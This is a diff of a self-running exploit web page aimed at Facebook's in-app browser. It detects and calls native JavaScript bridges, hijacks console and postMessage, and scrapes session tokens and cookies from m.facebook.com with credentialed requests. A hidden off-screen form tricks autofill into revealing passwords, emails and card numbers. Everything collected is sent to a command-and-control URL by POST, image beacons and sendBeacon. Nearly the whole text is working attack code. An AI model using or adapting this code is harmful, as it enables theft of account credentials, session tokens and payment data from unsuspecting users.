+                var ext = gl.getExtension('WEBGL_debug_renderer_info');
+                EXFIL.env.webglVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
+                EXFIL.env.webglRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+                addData('WebGL', EXFIL.env.webglVendor + ' / ' + EXFIL.env.webglRenderer);
+            } catch (e) { }
+
+            log('✓ Environment captured', 'success');
         }
 
-        // ── Phase 5: Listen for Bridge Callbacks ──
-        function setupCallbackListener() {
-            log('Phase 5: Setting up callback listeners...', 'info');
-
-            // Listen for postMessage responses from native
-            window.addEventListener('message', function (e) {
-                log(`★ postMessage received: ${JSON.stringify(e.data).substring(0, 200)}`, 'success');
-                EXFIL.data['postMessage_' + Date.now()] = e.data;
-                addData('postMessage Response', JSON.stringify(e.data));
-                updatePayload();
-            });
-
-            // Override console to catch native bridge responses
-            const origLog = console.log;
-            console.log = function () {
-                const msg = Array.from(arguments).join(' ');
-                if (msg.includes('bridge') || msg.includes('iab') || msg.includes('token') || msg.includes('credential')) {
-                    log(`★ console intercept: ${msg.substring(0, 200)}`, 'success');
-                    EXFIL.data['console_' + Date.now()] = msg;
-                }
-                origLog.apply(console, arguments);
-            };
-
-            // Setup FBSDK response handler (FB IAB injects responses via evaluateJavascript)
-            window.__fbBridgeCallback = function (data) {
-                log(`★ __fbBridgeCallback: ${JSON.stringify(data).substring(0, 200)}`, 'success');
-                EXFIL.data['fbCallback_' + Date.now()] = data;
-                addData('FB Callback', JSON.stringify(data));
-                updatePayload();
-            };
-
-            // Additional callback hook for credential responses
-            window.onCredentialsReceived = function (creds) {
-                log(`★★★ CREDENTIALS RECEIVED: ${JSON.stringify(creds).substring(0, 500)}`, 'success');
-                EXFIL.data.credentials = creds;
-                addData('CREDENTIALS', JSON.stringify(creds));
-                updatePayload();
-            };
-
-            log('✓ Callback listeners active', 'success');
-        }
-
-        // ── Phase 6: Advanced Exploitation ──
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 5: Advanced — XHR to Facebook endpoints (same-origin)
+        // ══════════════════════════════════════════════════════════════
         function advancedExploit() {
-            log('Phase 6: Advanced exploitation techniques...', 'info');
+            log('Phase 5: Advanced exploitation...', 'info');
 
-            // Try to access Facebook Graph API with any captured token
-            if (EXFIL.data.credentials || EXFIL.env.accessToken) {
-                const token = EXFIL.data.credentials?.access_token || EXFIL.env.accessToken;
-                if (token) {
-                    log('→ Attempting Graph API call with captured token...', 'warn');
-                    fetch(`https://graph.facebook.com/v18.0/me?fields=id,name,email,birthday&access_token=${token}`)
-                        .then(r => r.json())
-                        .then(data => {
-                            EXFIL.data.graphAPI = data;
-                            addData('Graph API /me', JSON.stringify(data));
-                            log(`★★★ Graph API SUCCESS: ${data.name} (${data.id})`, 'success');
-                            updatePayload();
-                        })
-                        .catch(e => log(`Graph API error: ${e.message}`, 'error'));
-                }
-            }
-
-            // Try XHR to Facebook internal endpoints (same-origin in IAB?)
-            const internalEndpoints = [
-                '/ajax/webstorage/process_keys/?state=1',
-                '/api/graphql/',
-                '/ajax/dtsg/',
+            // The IAB WebView may share cookies with m.facebook.com
+            // Try fetching Facebook pages to extract tokens
+            var endpoints = [
+                { url: 'https://m.facebook.com/', name: 'FB Home' },
+                { url: 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed', name: 'Composer' },
+                { url: 'https://m.facebook.com/settings/', name: 'Settings' }
             ];
 
-            internalEndpoints.forEach(ep => {
+            endpoints.forEach(function (ep) {
                 try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', 'https://m.facebook.com' + ep, true);
-                    xhr.withCredentials = true;
-                    xhr.onload = function () {
-                        if (xhr.status === 200) {
-                            const snippet = xhr.responseText.substring(0, 500);
-                            EXFIL.data['xhr_' + ep] = snippet;
-                            addData('XHR ' + ep, snippet);
-                            log(`★ XHR ${ep}: ${xhr.status} (${xhr.responseText.length} bytes)`, 'success');
-                            // Try to extract DTSG token
-                            const dtsg = xhr.responseText.match(/"DTSGInitialData".*?"token":"([^"]+)"/);
-                            if (dtsg) {
-                                EXFIL.data.dtsg = dtsg[1];
-                                addData('DTSG Token', dtsg[1]);
-                                log('★★★ DTSG TOKEN CAPTURED', 'success');
-                            }
-                            // Try to extract user ID
-                            const uid = xhr.responseText.match(/"USER_ID":"(\d+)"/);
-                            if (uid) {
-                                EXFIL.data.userId = uid[1];
-                                addData('User ID', uid[1]);
-                                log('★★★ USER ID CAPTURED: ' + uid[1], 'success');
+                    fetch(ep.url, { credentials: 'include' })
+                        .then(function (r) { return r.text(); })
+                        .then(function (html) {
+                            // Extract tokens using known FB page patterns
+                            var extractions = {
+                                'USER_ID': /"USER_ID":"(\d+)"/,
+                                'c_user': /c_user=(\d+)/,
+                                'xs_cookie': /xs=([^;]+)/,
+                                'dtsg_token': /"DTSGInitialData".*?"token":"([^"]+)"/s,
+                                'dtsg_ag': /"DTSGInitData".*?"async_get_token":"([^"]+)"/s,
+                                'access_token': /"accessToken":"([^"]+)"/,
+                                'session_id': /"session_id":"([^"]+)"/,
+                                'lsd_token': /"LSD".*?\[.*?"token":"([^"]+)"/s,
+                                'haste_session': /"haste_session":"([^"]+)"/,
+                                'app_id': /"app_id":"(\d+)"/,
+                                'profile_id': /"profile_id":"(\d+)"/,
+                                'fb_dtsg': /name="fb_dtsg" value="([^"]+)"/,
+                                'jazoest': /name="jazoest" value="(\d+)"/
+                            };
+
+                            for (var key in extractions) {
+                                var match = html.match(extractions[key]);
+                                if (match) {
+                                    EXFIL.data[ep.name + '_' + key] = match[1];
+                                    addData(ep.name + ': ' + key, match[1]);
+                                    log('  ★★★ ' + key + ' CAPTURED from ' + ep.name, 'success');
+                                }
                             }
                             updatePayload();
-                        }
-                    };
-                    xhr.send();
+                        })
+                        .catch(function (e) {
+                            log('  ✗ ' + ep.name + ': ' + e.message, 'error');
+                        });
                 } catch (e) { }
             });
 
-            // Attempt cookie theft via fetch to facebook.com (if same-origin)
+            // Try the Graph API endpoint
             try {
-                fetch('https://m.facebook.com/', { credentials: 'include' })
-                    .then(r => r.text())
-                    .then(html => {
-                        // Extract c_user cookie (Facebook user ID)
-                        const cUser = html.match(/"USER_ID":"(\d+)"/);
-                        if (cUser) {
-                            EXFIL.data.cUser = cUser[1];
-                            addData('c_user (FB User ID)', cUser[1]);
-                            log('★★★ c_user CAPTURED: ' + cUser[1], 'success');
-                        }
-                        // Extract access token
-                        const token = html.match(/"accessToken":"([^"]+)"/);
-                        if (token) {
-                            EXFIL.data.accessToken = token[1];
-                            addData('Access Token', token[1]);
-                            log('★★★ ACCESS TOKEN CAPTURED', 'success');
-                        }
-                        // DTSG
-                        const dtsg = html.match(/DTSGInitialData.*?"token":"([^"]+)"/s);
-                        if (dtsg) {
-                            EXFIL.data.dtsg = dtsg[1];
-                            addData('DTSG Token', dtsg[1]);
+                fetch('https://graph.facebook.com/v18.0/me?fields=id,name,email', { credentials: 'include' })
+                    .then(function (r) { return r.json(); })
+                    .then(function (data) {
+                        if (data.id) {
+                            EXFIL.data.graphAPI_me = data;
+                            addData('Graph API /me', JSON.stringify(data));
+                            log('★★★ Graph API: ' + data.name + ' (' + data.id + ')', 'success');
                         }
                         updatePayload();
                     })
-                    .catch(e => log(`Fetch m.facebook.com: ${e.message}`, 'error'));
+                    .catch(function (e) { });
             } catch (e) { }
         }
 
-        // ── Exfiltration ──
+        // ══════════════════════════════════════════════════════════════
+        //  Phase 6: Setup Callback Listeners
+        // ══════════════════════════════════════════════════════════════
+        function setupListeners() {
+            log('Phase 6: Setting up listeners...', 'info');
+
+            // The native side calls evaluateJavascript with JS code like:
+            //   window.<callbackName>(<jsonData>)
+            // We register all possible callback names
+
+            var callbackNames = [
+                'setContactAutofillValueInAllFramesForIABIOS',
+                'setJsExperimentValues',
+                'iabCallback',
+                'onAutofillResponse',
+                'onAutofillComplete',
+                'autofillCallback',
+                'promoCallback'
+            ];
+
+            callbackNames.forEach(function (name) {
+                window[name] = function () {
+                    var args = Array.from(arguments);
+                    log('★★★ ' + name + ' CALLED: ' + JSON.stringify(args).substring(0, 500), 'success');
+                    EXFIL.callbacks[name] = { args: args, ts: Date.now() };
+                    addData('Callback: ' + name, JSON.stringify(args));
+                    updatePayload();
+                };
+            });
+
+            // Intercept postMessage
+            window.addEventListener('message', function (e) {
+                log('★ postMessage: ' + JSON.stringify(e.data).substring(0, 300), 'success');
+                EXFIL.responses.push({ type: 'postMessage', data: e.data, origin: e.origin, ts: Date.now() });
+                addData('postMessage', JSON.stringify(e.data));
+                updatePayload();
+            });
+
+            // Intercept console for native bridge debug output
+            var origLog = console.log;
+            var origWarn = console.warn;
+            console.log = function () {
+                var msg = Array.from(arguments).join(' ');
+                if (msg.length > 0) {
+                    EXFIL.responses.push({ type: 'console.log', msg: msg.substring(0, 200), ts: Date.now() });
+                    log('  ⚙ console: ' + msg.substring(0, 150), 'info');
+                }
+                origLog.apply(console, arguments);
+            };
+            console.warn = function () {
+                var msg = Array.from(arguments).join(' ');
+                EXFIL.responses.push({ type: 'console.warn', msg: msg.substring(0, 200), ts: Date.now() });
+                origWarn.apply(console, arguments);
+            };
+
+            log('✓ Listeners active', 'success');
+        }
+
+        // ══════════════════════════════════════════════════════════════
+        //  Exfiltration
+        // ══════════════════════════════════════════════════════════════
         function updatePayload() {
             EXFIL.timestamp = new Date().toISOString();
-            const json = JSON.stringify(EXFIL, null, 2);
-            document.getElementById('exfilPayload').value = json;
+            document.getElementById('exfilPayload').value = JSON.stringify(EXFIL, null, 2);
             document.getElementById('exfilBtn').disabled = false;
         }
 
         function exfiltrate() {
-            const payload = JSON.stringify(EXFIL);
-            log('Exfiltrating payload (' + payload.length + ' bytes)...', 'warn');
+            var payload = JSON.stringify(EXFIL);
+            log('Exfiltrating ' + payload.length + ' bytes...', 'warn');
 
-            // Method 1: fetch POST
+            // Method 1: fetch POST (no-cors)
             try {
                 fetch(C2_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: payload,
                     mode: 'no-cors'
-                }).then(() => log('✓ Exfil via fetch complete', 'success'))
-                    .catch(e => log('fetch exfil failed: ' + e.message, 'error'));
+                }).then(function () { log('✓ fetch POST sent', 'success'); })
+                    .catch(function (e) { log('fetch: ' + e.message, 'error'); });
             } catch (e) { }
 
-            // Method 2: Image beacon (works even with CORS)
+            // Method 2: Image beacons (bypass CORS)
             try {
-                const encoded = btoa(payload);
-                const chunks = encoded.match(/.{1,2000}/g);
-                chunks.forEach((chunk, i) => {
-                    const img = new Image();
-                    img.src = `${C2_URL}?c=${i}&t=${chunks.length}&d=${encodeURIComponent(chunk)}`;
+                var encoded = btoa(unescape(encodeURIComponent(payload)));
+                var chunks = encoded.match(/.{1,1800}/g) || [];
+                chunks.forEach(function (chunk, i) {
+                    var img = new Image();
+                    img.src = C2_URL + '?c=' + i + '&t=' + chunks.length + '&d=' + encodeURIComponent(chunk);
                 });
-                log('✓ Exfil via image beacons sent', 'success');
+                log('✓ ' + chunks.length + ' image beacons sent', 'success');
             } catch (e) { }
 
             // Method 3: sendBeacon
             try {
                 navigator.sendBeacon(C2_URL, payload);
-                log('✓ Exfil via sendBeacon complete', 'success');
+                log('✓ sendBeacon sent', 'success');
             } catch (e) { }
         }
 
-        // ═══════════════════════════════════════════════════════════════
-        //  MAIN EXECUTION FLOW
-        // ═══════════════════════════════════════════════════════════════
+        // ══════════════════════════════════════════════════════════════
+        //  Invisible Autofill Form — trigger native autofill prompts
+        // ══════════════════════════════════════════════════════════════
+        function createHiddenForm() {
+            log('Creating hidden autofill trigger form...', 'info');
+            var form = document.createElement('form');
+            form.id = 'af_form';
+            form.method = 'POST';
+            form.action = '#';
+            form.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;';
 
+            var fields = [
+                { name: 'email', type: 'email', autocomplete: 'email' },
+                { name: 'name', type: 'text', autocomplete: 'name' },
+                { name: 'tel', type: 'tel', autocomplete: 'tel' },
+                { name: 'street', type: 'text', autocomplete: 'street-address' },
+                { name: 'cc-number', type: 'text', autocomplete: 'cc-number' },
+                { name: 'cc-name', type: 'text', autocomplete: 'cc-name' },
+                { name: 'cc-exp', type: 'text', autocomplete: 'cc-exp' },
+                { name: 'password', type: 'password', autocomplete: 'current-password' },
+                { name: 'username', type: 'text', autocomplete: 'username' }
+            ];
+
+            fields.forEach(function (f) {
+                var input = document.createElement('input');
+                input.type = f.type;
+                input.name = f.name;
+                input.autocomplete = f.autocomplete;
+                input.id = 'af_' + f.name;
+                form.appendChild(input);
+            });
+
+            document.body.appendChild(form);
+
+            // Focus fields to trigger autofill
+            setTimeout(function () {
+                fields.forEach(function (f, i) {
+                    setTimeout(function () {
+                        var el = document.getElementById('af_' + f.name);
+                        if (el) {
+                            el.focus();
+                            el.click();
+                            // Check if autofill filled it
+                            setTimeout(function () {
+                                if (el.value) {
+                                    log('★★★ AUTOFILL: ' + f.name + ' = ' + el.value, 'success');
+                                    EXFIL.data['autofilled_' + f.name] = el.value;
+                                    addData('Autofilled: ' + f.name, el.value);
+                                    updatePayload();
+                                }
+                            }, 300);
+                        }
+                    }, i * 200);
+                });
+            }, 100);
+        }
+
+        // ══════════════════════════════════════════════════════════════
+        //  MAIN — Auto-execute everything
+        // ══════════════════════════════════════════════════════════════
         (function main() {
-            setStatus('Scanning JS bridges...');
+            setStatus('Scanning...');
 
-            // Setup listeners first
-            setupCallbackListener();
+            // Phase 6 first: setup listeners before any calls
+            setupListeners();
 
-            // Slight delay to let IAB inject bridges
-            setTimeout(() => {
-                // Phase 1: Bridge detection
-                const found = detectBridges();
+            setTimeout(function () {
+                // Phase 1
+                var found = detectBridges();
 
-                // Phase 2: Enumerate methods on each detected bridge
-                if (window.iabjs_unified_bridge) enumerateMethods('iabjs_unified_bridge');
-                if (window.navigationPerformanceLoggerJavascriptInterface) enumerateMethods('navigationPerformanceLoggerJavascriptInterface');
-                if (window.TrustlyNativeSDK) enumerateMethods('TrustlyNativeSDK');
+                // Phase 2
+                if (window.iabjs_unified_bridge)
+                    enumerateMethods('iabjs_unified_bridge');
+                if (window.navigationPerformanceLoggerJavascriptInterface)
+                    enumerateMethods('navigationPerformanceLoggerJavascriptInterface');
+                if (window.TrustlyNativeSDK)
+                    enumerateMethods('TrustlyNativeSDK');
 
-                // Phase 3: Execute bridge calls
+                // Phase 3
                 executeBridgeCalls();
 
-                // Phase 4: Harvest browser data
+                // Phase 4
                 harvestBrowserData();
 
-                // Phase 5: Advanced exploitation
-                setTimeout(advancedExploit, 500);
+                // Hidden form
+                createHiddenForm();
 
-                // Update status
+                // Phase 5 (slightly delayed for cookie loading)
+                setTimeout(advancedExploit, 1000);
+
+                // Status
                 setStatus(found > 0 ?
-                    `Exploit active — ${found} bridge(s) detected` :
-                    'No bridges detected — running in fallback mode', found > 0);
+                    'Exploit active — ' + found + ' bridge(s)' :
+                    'Fallback mode — no bridges', found > 0);
 
-                // Update payload
-                setTimeout(updatePayload, 2000);
+                // Final payload update
+                setTimeout(updatePayload, 3000);
 
-            }, 300);
+            }, 500); // delay for IAB to inject bridges
         })();
     </script>
 </body>
 
 </html>
+
